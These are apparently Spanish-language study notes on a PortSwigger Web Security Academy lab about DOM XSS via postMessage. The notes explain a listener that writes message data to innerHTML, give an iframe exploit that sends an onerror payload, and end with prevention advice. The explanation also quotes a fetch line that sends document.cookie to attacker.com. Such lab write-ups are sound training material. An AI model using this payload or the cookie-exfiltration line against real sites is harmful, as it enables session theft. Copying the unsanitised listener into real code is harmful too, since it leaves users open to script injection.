---
title: "1 - DOM XSS using web messages"
---

# 1 - DOM XSS using web messages

`window.addEventListener('message', function(e) {
`document.getElementById('ads').innerHTML = e.data;
`})`

El código que has compartido añade un *event listener* al objeto `window` para escuchar el evento `'message'`. Este evento se dispara cuando se recibe un mensaje desde otra ventana, un `iframe`, o un script en otro dominio (usando la API `postMessage`).

### Desglose del código:

1. **`window.addEventListener('message', function(e) { ... })`**:
   - Este fragmento agrega un "escuchador" para el evento `message` en el objeto `window`.
   - El evento `message` se activa cuando un script envía un mensaje al documento utilizando `window.postMessage()`.

2. **`function(e) { ... }`**:
   - Es una función anónima que se ejecuta cada vez que se recibe un mensaje. El parámetro `e` es el objeto del evento, que contiene datos relevantes sobre el mensaje recibido.

3. **`document.getElementById('ads').innerHTML = e.data;`**:
   - Este código actualiza el contenido HTML del elemento con el ID `'ads'` en el documento.
   - La propiedad `e.data` contiene los datos enviados por el remitente del mensaje. Estos datos se insertan directamente en el HTML del elemento.


==El siguiente código envía un post message, como la página está escuchando lo incrustará en ads sin sanitización y si  filtrado de urls origen==


`&lt;iframe src="https://0aac00e603759fe580288a3400c1008f.web-security-academy.net/" onload="this.contentWindow.postMessage('&lt;img src=1 onerror=print()>','*')">


El código que has compartido intenta explotar una vulnerabilidad de tipo Cross-Site Scripting (XSS) utilizando un iframe que carga una URL externa y envía un mensaje malicioso mediante la API `postMessage`. Aquí está el desglose de lo que está haciendo:

### Explicación del Código:

```html
<iframe src="https://0aac00e603759fe580288a3400c1008f.web-security-academy.net/" 
        onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

1. **`<iframe src="...">`**:
   - Crea un iframe que carga la URL `https://0aac00e603759fe580288a3400c1008f.web-security-academy.net/`. Un iframe permite incrustar otra página web dentro de la actual.

2. **`onload="this.contentWindow.postMessage(...)"`**:
   - El atributo `onload` se activa cuando el contenido del iframe ha terminado de cargarse.
   - `this.contentWindow` se refiere al objeto `window` de la página cargada dentro del iframe.
   - `postMessage('<img src=1 onerror=print()>', '*')` envía un mensaje al contenido del iframe. Este mensaje contiene un payload malicioso: `'<img src=1 onerror=print()>'`.

3. **El Payload**:
   - El payload `'<img src=1 onerror=print()>'` es un intento de inyectar código JavaScript que se ejecutará cuando ocurra un error en la carga de la imagen (porque la URL `src=1` no es válida).
   - `onerror=print()` es el código que se ejecuta cuando falla la carga de la imagen. `print()` es una función que en algunos navegadores puede abrir el cuadro de diálogo de impresión, pero en un escenario real, este atributo podría ser reemplazado por cualquier código malicioso, como `alert(document.cookie)` o `fetch('http://attacker.com/?data='+document.cookie)` para exfiltrar cookies.

### Condiciones para la Explotación:

- **Aceptación del Mensaje**: La página cargada dentro del iframe debe tener un `message` event listener que acepte y procese el mensaje sin validar correctamente el contenido. Esto significa que, en su código JavaScript, debe haber algo similar a `window.addEventListener('message', function(e) { document.body.innerHTML = e.data; });`, que inserta directamente el contenido del mensaje en el DOM.
  
- **Permitir ejecución de código**: Si la página inserta el contenido del mensaje en el DOM sin sanitización, entonces se ejecutará el código malicioso (`onerror=print()` en este caso).

### Riesgos:

Si el sitio vulnerable no valida correctamente los mensajes que recibe a través de `postMessage`, este código podría resultar en la ejecución de scripts arbitrarios, lo que llevaría a un ataque de Cross-Site Scripting (XSS).

### Prevención:

- **Sanitización y validación**: La página dentro del iframe debe asegurarse de validar y sanitizar cualquier mensaje recibido a través de `postMessage` para prevenir la inyección de código malicioso.
  
- **Uso seguro de `postMessage`**: Limitar el origen de los mensajes a dominios de confianza utilizando `e.origin` en lugar de aceptar mensajes de cualquier origen (`'*'`).
